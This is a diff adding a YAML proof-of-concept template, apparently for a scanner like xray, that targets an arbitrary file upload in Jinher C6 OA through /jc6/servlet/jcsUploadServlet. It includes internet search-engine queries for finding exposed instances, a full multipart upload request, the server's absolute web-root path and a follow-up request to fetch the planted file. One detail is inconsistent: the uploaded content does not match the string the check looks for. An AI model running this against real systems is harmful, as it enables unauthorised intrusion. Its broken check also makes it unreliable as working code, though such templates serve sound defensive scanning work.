@@ -1,0 +1,50 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Jinher-OA"
+    hunter-query: app.name="金和 OA"
+    quake-query: app:"金和OA"
+    zoomeye-query: app:"金和OA"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips:  /jc6/upload/2023-10-27/4ndex.txt 时间戳获取当天时间 now() 格式一下即可 |  绝对路径 D:/Jinher/JC6Server/apache-tomcat-6.0.32-X64/webapps/jc6/upload/2023-10-27/4ndex.txt  
+
+name: poc-yaml-jinhe-c6-jcsUploadServlet-upload
+transport: http
+set:
+  s1: randomInt(1000000000, 9000000000)
+  s2: randomLowercase(8)
+  t1: timeConvert(now(), '2006-01-02')
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /jc6/servlet/jcsUploadServlet?mtpId=
+      follow_redirects: false
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{s2}}
+      body: "------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"iframeId\"\r\n\r\n4ndex.txt\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"fileSuffix\"\r\n\r\n\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"myFile\"; filename=\"1.txt\"\r\nContent-Type: application/octet-stream\r\n\r\n3q`0m\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"attachmentId\"\r\n\r\n\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"isSingle\"\r\n\r\n\r\n------WebKitFormBoundary{{s2}}\r\nContent-Disposition: form-data; name=\"fileOldName\"\r\n\r\n\r\n------WebKitFormBoundary{{s2}}--\r\n"
+    expression: >-
+      response.status == 200 &&  response.body_string.contains("OK")
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+  r1:
+    request:
+      method: GET
+      cache: true
+      path: /jc6/upload/{{t1}}/4ndex.txt
+      follow_redirects: false
+      headers: 
+      body:
+    expression: >-
+      response.status == 200 && response.body_string.contains("4ra1n")
+
+expression: r0() && r1()
